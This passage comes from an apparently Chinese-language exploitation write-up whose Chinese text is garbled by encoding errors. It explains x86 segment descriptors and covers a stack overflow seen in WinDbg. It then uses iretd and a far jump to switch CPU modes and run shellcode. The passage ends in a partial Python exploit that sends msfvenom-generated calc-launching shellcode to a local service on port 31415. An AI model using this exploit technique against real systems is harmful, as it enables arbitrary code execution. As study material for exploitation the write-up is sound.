</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">p</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// æ®µå­˜åœ¨ä½ (Segment Present)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">limit_high</span> : <span style="color:#bd93f9">4</span>;    <span style="color:#6272a4">// æ®µé™ç•Œ 16-19 bits (Segment Limit)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">avl</span> : <span style="color:#bd93f9">1</span>;           <span style="color:#6272a4">// å¯ç”¨ä½ (Available for use by system software)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">l</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// 64-bit code segment (0 for non-64-bit code segments)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">db</span> : <span style="color:#bd93f9">1</span>;            <span style="color:#6272a4">// é»˜è®¤æ“ä½œå¤§å° (Default Operation Size, 0=16-bit, 1=32-bit)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">g</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// ç²’åº¦ (Granularity, 0=byte, 1=4KB)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  base_high;         <span style="color:#6272a4">// åŸºåœ°å€ 24-31 bits (Base Address)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>} SegmentDescriptor;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-------------------------------------------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>  Base <span style="color:#bd93f9">31</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">24</span>  <span style="color:#ff79c6">|</span> G <span style="color:#ff79c6">|</span> D<span style="color:#ff79c6">/</span>B <span style="color:#ff79c6">|</span> L <span style="color:#ff79c6">|</span> AVL <span style="color:#ff79c6">|</span> Limit <span style="color:#bd93f9">19</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">16</span> <span style="color:#ff79c6">|</span> P <span style="color:#ff79c6">|</span> DPL <span style="color:#ff79c6">|</span> S  <span style="color:#ff79c6">|</span> Type <span style="color:#ff79c6">|</span> Base <span style="color:#bd93f9">23</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">16</span> <span style="color:#ff79c6">|</span>  Base <span style="color:#bd93f9">15</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0</span>  <span style="color:#ff79c6">|</span> Limit <span style="color:#bd93f9">15</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0</span> <span style="color:#ff79c6">|</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-------------------------------------------------------------------------------------------------------------</span>
</span></span></code></pre></div><p>æ®µå¯„å­˜å™¨ä¿å­˜16ä½å®½çš„æ®µé€‰æ‹©ç¬¦segment selector</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// æ®µé€‰æ‹©å™¨ç»“æ„
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint16_t</span> <span style="color:#8be9fd;font-style:italic">rpl</span>  : <span style="color:#bd93f9">2</span>;  <span style="color:#6272a4">// è¯·æ±‚ç‰¹æƒçº§åˆ« (Request Privilege Level)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint16_t</span> <span style="color:#8be9fd;font-style:italic">ti</span>   : <span style="color:#bd93f9">1</span>;  <span style="color:#6272a4">// æè¿°ç¬¦è¡¨æŒ‡ç¤ºå™¨ (Table Indicator, 0 for GDT, 1 for LDT)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint16_t</span> <span style="color:#8be9fd;font-style:italic">index</span>: <span style="color:#bd93f9">13</span>; <span style="color:#6272a4">// æè¿°ç¬¦è¡¨ç´¢å¼• (Descriptor Table Index)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>} SegmentSelector;
</span></span></code></pre></div><p>cs,ssçš„å€¼ä»£è¡¨æè¿°ç¬¦åœ¨ LDT/GDT ä¸­çš„åç§»ã€‚</p>
<ul>
<li>TI = 0 ä½¿ç”¨GDT</li>
<li>TI = 1 ä½¿ç”¨LDT</li>
</ul>
<p>å¹¶ä¸”åœ¨ amd64 cpuä¸‹ï¼Œæ®µå¯„å­˜å™¨ç›¸å¯¹å›ºå®š
-Â 0x00: æ’ä¸º0</p>
<ul>
<li><strong>å†…æ ¸æ¨¡å¼</strong>ï¼š
<ul>
<li><code>CS</code>å¯„å­˜å™¨çš„å€¼ä¸º<code>0x10</code>ï¼Œå¯¹åº”äºGDTä¸­çš„<code>KERNEL_CODE_SELECTOR</code>ã€‚</li>
<li><code>SS</code> ä¸º <code>0x18</code></li>
</ul>
</li>
<li><strong>ç”¨æˆ·æ¨¡å¼</strong>ï¼š
<ul>
<li><code>CS</code>å¯„å­˜å™¨çš„å€¼ä¸º<code>0x33</code>ï¼Œå¯¹åº”äºGDTä¸­çš„<code>USER_CODE_SELECTOR</code>ï¼Œå¹¶è®¾ç½®RPLï¼ˆè¯·æ±‚ç‰¹æƒçº§ï¼‰ä¸º3ã€‚</li>
<li><code>SS</code> ä¸º 0x28</li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬å¾—åˆ°åŸºå€å°±å¯ä»¥è·å¾— <code>cs:ip çš„å€¼</code></p>
<p>ä½¿ç”¨IDAè°ƒè¯•å‘ç”Ÿé”™è¯¯ï¼Œä½¿ç”¨WinDbgXè°ƒè¯•</p>
<p>è§‚å¯Ÿrsp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">&gt;</span> dq @rsp
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e8d0  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e8e0  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e8f0  <span style="color:#bd93f9">00000f</span><span style="color:#bd93f9">02</span>`<span style="color:#bd93f9">00001000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e900  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e910  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e920  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e930  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e940  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span></code></pre></div><p>å› æ­¤æˆ‘ä»¬å…ˆè®©æ­¤å‡½æ•°æ‰§è¡Œ6æ¬¡ <code>pop rax</code>ï¼Œåœ¨æ‰§è¡Œ<code>iretd</code>ï¼ˆWinDbgXæ˜¾ç¤ºï¼‰ ä»è€Œæ§åˆ¶ssç­‰å¯„å­˜å™¨ã€‚</p>
<p>æˆ‘ä»¬ç¨‹åºåŸæœ¬çš„ss</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0:<span style="color:#8be9fd;font-style:italic">000</span><span style="color:#6272a4">&gt; r ss</span>
</span></span><span style="display:flex;"><span>ss=002b
</span></span><span style="display:flex;"><span>0:<span style="color:#8be9fd;font-style:italic">000</span><span style="color:#6272a4">&gt; r cs</span>
</span></span><span style="display:flex;"><span>cs=0033
</span></span></code></pre></div><p>è¿™é‡Œå°±æ˜¯æ¯”è¾ƒéš¾çš„ç‚¹ï¼Œéœ€è¦æˆ‘ä»¬çŸ¥é“ x86_64ä¸‹ï¼Œiretd éœ€è¦popçš„æ˜¯x86çš„cså’Œssã€‚ä¹Ÿå°±æ˜¯å¯»æ‰¾ä¸€ä¸ª <code>SegmentDescriptor.l = 0</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// dg [selector [number]]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> r gdtr
</span></span><span style="display:flex;"><span>gdtr<span style="color:#ff79c6">=</span>fffff8027bb59fb0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dg <span style="color:#bd93f9">0x23</span>
</span></span><span style="display:flex;"><span>                                                    P Si Gr Pr Lo
</span></span><span style="display:flex;"><span>Sel        Base              Limit          Type    l ze an es ng Flags
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">----</span> <span style="color:#ff79c6">-----------------</span> <span style="color:#ff79c6">-----------------</span> <span style="color:#ff79c6">----------</span> <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--------</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0020</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`ffffffff Code RE Ac <span style="color:#bd93f9">3</span> Bg Pg P  Nl <span style="color:#bd93f9">00000</span>cfb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dq fffff8027bb59fb0<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x20</span>
</span></span><span style="display:flex;"><span>fffff802`<span style="color:#bd93f9">7</span>bb59fd0  <span style="color:#bd93f9">00</span>cffb00`<span style="color:#bd93f9">0000ff</span>ff <span style="color:#bd93f9">00</span>cff300`<span style="color:#bd93f9">0000ff</span>ff
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> .formats <span style="color:#bd93f9">00</span>cffb00`<span style="color:#bd93f9">0000ff</span>ff
</span></span><span style="display:flex;"><span>Evaluate <span style="color:#8be9fd;font-style:italic">expression</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Hex</span>:     <span style="color:#bd93f9">00</span>cffb00`<span style="color:#bd93f9">0000ff</span>ff
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Decimal</span>: <span style="color:#bd93f9">58541297597743103</span>
</span></span><span style="display:flex;"><span>  Decimal (<span style="color:#8be9fd">unsigned</span>) <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">58541297597743103</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Octal</span>:   <span style="color:#bd93f9">0003177660000000177777</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Binary</span>:  <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">11001111</span> <span style="color:#bd93f9">11111011</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">11111111</span> <span style="color:#bd93f9">11111111</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Chars</span>:   ........
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Time</span>:    Thu Jul  <span style="color:#bd93f9">6</span> <span style="color:#bd93f9">11</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">09</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">19.774</span> <span style="color:#bd93f9">1786</span> (UTC <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">00</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Float</span>:   low <span style="color:#bd93f9">9.18341e-041</span> high <span style="color:#bd93f9">1.91e-038</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Double</span>:  <span style="color:#bd93f9">9.10834e-305</span>
</span></span></code></pre></div><p>è§‚å¯Ÿ <code>l</code> ä½ä¸º0ï¼Œä»£è¡¨ä¸º32ä½ã€‚åŒç†æ‰¾åˆ° <code>0x53</code> data segment</p>
<ul>
<li>å‚è€ƒï¼š<a href="https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html">The 0x33 Segment Selector</a></li>
</ul>
<p>eflagså¯ä»¥ç›´æ¥è°ƒè¯•å¾—å‡ºï¼Œå¯ä»¥ä¸æ”¹å˜</p>
<p>iretd ä¼šè½¬åŒ–ä¸€æ¬¡æ¶æ„ä½ä¸ºx86æ¶æ„ï¼Œæˆ‘ä»¬ç”Ÿæˆçš„shellcodeä¸ºx64ï¼Œå†æ¬¡è½¬åŒ–æ¶æ„ä¹Ÿå°±æ˜¯ <code>jmp cs:ip</code> æ‰§è¡Œå†æ¬¡è½¬åŒ–</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">p64</span>(v):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;Q&#34;</span>, v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">p32</span>(v):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;I&#34;</span>, v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">p16</span>(v):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;H&#34;</span>, v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># addr = &#34;192.168.85.128&#34;</span>
</span></span><span style="display:flex;"><span>addr <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">31415</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>conn <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>conn<span style="color:#ff79c6">.</span>connect((addr, port))
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> conn:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Error connect&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Hello</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>conn<span style="color:#ff79c6">.</span>send(payload)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(conn<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">3</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">RIP|CS|RFLAGS|SP|SS
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>ctx <span style="color:#ff79c6">=</span> p32(<span style="color:#bd93f9">0x10000014</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x23</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x202</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x10000000</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x53</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># msfvenom -a x64 --platform Windows -p windows/x64/exec cmd=&#34;calc&#34; -f python -v shellcode</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xda\xff\xd5\x63\x61\x6c\x63\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&gt;&gt;&gt; asm(&#34;JMP 0x33:0x1000001c&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">b&#39;</span><span style="color:#f1fa8c">\xea\x1c\x00\x00\x10</span><span style="color:#f1fa8c">3</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>jmp_shellcode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xea\x1c\x00\x00\x10</span><span style="color:#f1fa8c">3</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#6272a4"># JMP 0x33:0x1000001c</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&gt;&gt;&gt; asm(&#34;mov rsp, rcx&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">b&#39;H</span><span style="color:#f1fa8c">\x89\xcc</span><span style="color:#f1fa8c">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>origin_rsp <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;H</span><span style="color:#f1fa8c">\x89\xcc</span><span style="color:#f1fa8c">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">7</span>
</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x323230326F6B45</span>)
</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span>
</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">+=</span> p16(<span style="color:#bd93f9">0x8000</span>)
